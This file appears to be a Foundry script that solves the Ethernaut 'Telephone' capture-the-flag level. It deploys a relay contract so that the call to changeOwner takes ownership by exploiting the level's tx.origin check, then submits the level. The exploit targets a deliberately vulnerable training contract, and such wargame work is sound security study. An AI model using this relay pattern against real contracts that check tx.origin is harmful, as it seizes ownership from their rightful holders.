// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

import {Level} from "ethernaut/levels/base/Level.sol";
import {Vm, console, Attacker} from "../src/Attacker.sol";
import {Telephone} from "../src/Telephone.sol";

/*
 * Level address: 0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446
 * Claim ownership of the contract below to complete this level.
 *
*/
contract Relay {
    function attack(Telephone telephone, address me) external {
        telephone.changeOwner(me);
    }
}

contract TelephoneScript is Attacker {
    Level private level = Level(0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446);

    function run() external {
        vm.startBroadcast(me.privateKey);
        address instance = getNewLevelInstance(level);
        Telephone telephone = Telephone(instance);
        Relay relay = new Relay();
        relay.attack(telephone, me.addr);

        require(telephone.owner() == me.addr);
        require(submitInstance(), "Level submission failed");
        vm.stopBroadcast();
    }
}
